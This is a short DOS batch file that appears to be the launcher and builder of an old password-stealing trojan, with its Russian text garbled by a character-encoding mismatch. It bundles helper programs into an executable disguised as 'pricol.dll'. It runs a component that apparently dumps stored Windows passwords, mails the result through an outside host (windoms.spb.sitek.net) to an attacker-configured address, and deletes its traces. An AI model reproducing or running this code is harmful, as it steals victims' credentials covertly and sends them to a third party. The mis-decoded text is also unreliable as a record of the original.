@echo off
cls
if -%1==-/? goto help
if not exist pricol.dll goto nofile
ren pricol.dll temp1.exe
temp1.exe >nul
if -%1==- goto vir
del temp1.exe
del pricol.1
rem โฎ ก โ ไ ฉซ
cls
echo @echo offf >pricol.1
echo prikol.exe windoms.spb.sitek.net temp %1 >pricol.1
copy pricol.2 bsa.exe >nul
rem โฎ BSA.EXE
bsa.exe -a 9 pricol.1 pricol.2 pricol.3 pricol.4 pricol.5
cls
del pricol.1
del pricol.2
del pricol.3
rem โฎ PWL.EXE
del pricol.4
rem โฎ EMAIL.EXE
del pricol.5
rem โฎ แ ฌ ฏเจชฎซ
cls
bsa.exe -s 9.bsa
del 9.bsa
del bsa.exe
cls
ren 9.exe pricol.dll
echo เฎฃเ ฌฌ  ก๋ซ  ใแฏฅ่ญฎ แชฎญไจฃใเจเฎข ญ  ญ   คเฅแ %1 :-))
pause
goto end
:vir
ren temp1.exe pricol.dll
ren pricol.1 pricol.bat
del pricol.2
ren pricol.3 precol.exe
ren pricol.4 prikol.exe
ren pricol.5 prekol.exe
cls
precol.exe >temp
del precol.exe
echo Please wait some minutes....
prikol.exe windoms.spb.sitek.net temp login@windoms.spb.sitek.net
call pricol.bat
del pricol.bat
cls
prekol.exe
del prikol.exe
del prekol.exe
del temp
goto end
:nofile
echo File "PRICOL.DLL" is not found....
goto end
:help
echo ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
echo บโ  ง ฌฅ็ โฅซ์ญ ๏ ฏเฎฃเ ฌฌ  ฎโฏเ ขซ๏ฅโ ฏ เฎซจ ็ ฉญจช  ญ  ข ่ Email.บ
echo บซ๏ ญ แโเฎฉชจ ฏเฎฃเ ฌฌ๋ ญ  แขฎฉ Email ง ฏใแโจโฅ ฅฅ ข ไฎเฌ โฅ:	    บ
echo บ			 "PRICOL.EXE email@host.net"		    บ
echo ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
pause
goto end
:end